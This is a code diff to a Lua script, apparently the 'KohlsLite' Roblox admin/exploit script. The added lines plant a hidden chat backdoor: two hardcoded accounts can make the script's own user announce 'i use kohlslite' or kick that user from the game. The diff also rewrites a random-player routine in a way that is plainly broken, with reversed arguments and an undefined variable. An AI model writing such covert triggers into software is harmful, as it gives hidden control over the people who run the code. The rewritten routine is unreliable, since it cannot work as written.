@@ -3763,9 +3763,13 @@ task.wait(4)
 Chat('h \n\n\n Whoops, that was the wrong thing! \n\n\n')
 task.wait(4)
 
-local Players = game.Players:GetPlayers() -- bugged
+local coems = {}
+for i, v in pairs(game.Players:GetPlayers()) do
+	table.insert(v.Name, coems)
+end
+
 local randomPlayer = "Placeholder"
-randomPlayer = Players[math.random(#Players)]
+randomPlayer = Players[math.random(#coems)]
 
 Chat('h \n\n\n Hopefully'..randomPlayer..'forgives me... \n\n\n')
 if randomPlayer == game.Players.LocalPlayer then
@@ -3773,6 +3777,9 @@ if randomPlayer == game.Players.LocalPlayer then
    Chat("h \n\n\n Wait a second... that's me!!!!!!! \n\n\n")
 end
 
+for i in pairs(coems) do
+    table.remove(coems, i)
+end
 end
 
 -- AD
@@ -3918,16 +3925,19 @@ v.Chatted:Connect(function(msg)
             	end
 		end
 
+		if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq") then
+                        Say("i use kohlslite")
+                end
 
-
-
-                    
+                if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq") then
+			game.Players.LocalPlayer:Kick("SkiddingProgrammer {kohlslite owner} kicked you from the game!")
+                end  
 -- ADMIN
-            if (alladmin == true or table.find(FAdmins, v.Name)) and not table.find(blacklist, v.Name) and not table.find(newplrslocked, v.Name) and v.Name ~= game.Players.LocalPlayer.Name then
+            if (alladmin == true or table.find(FAdmins, v.Name)) and not table.find(blacklist, v.Name) and not table.find(newplrslocked, v.Name) and not slockenabled and v.Name ~= game.Players.LocalPlayer.Name then
             	local command = string.gsub(msg:lower(), "me", v.Name)
             	if string.sub(command, 1, 1) == ":" then
               	 	command = ""
-               		Chat("pm "..v.Name.." [KohlsLite]: Please use commands without : . Thanks!")
+               		Chat("pm "..v.Name.." [KohlsLite]: Please use commands without : - Thanks!")
             	end
             
            	 if string.sub(command, 1, 1) == "/" then -- because /e dance
